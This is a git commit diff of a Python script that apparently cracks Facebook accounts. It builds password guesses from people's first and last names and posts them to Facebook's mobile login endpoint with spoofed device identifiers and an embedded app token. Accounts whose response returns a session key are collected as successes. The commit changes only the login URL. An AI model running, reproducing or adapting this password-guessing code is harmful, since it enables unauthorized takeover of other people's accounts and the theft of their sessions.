809200fd0e35d5d6c1b28ed12165d0faba0bcb53
R4FSAN-143 <124475382+R4FSAN-143@users.noreply.github.com>
2023-03-18 16:43:13 +0600

    Add files via upload

--- sd.py
+++ sd.py
@@ -290,7 +290,7 @@ def method():
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
             data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
-            response = r.post('https://x.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
+            response = r.post('https://x.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',data=data,headers=header,allow_redirects=False)
       #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
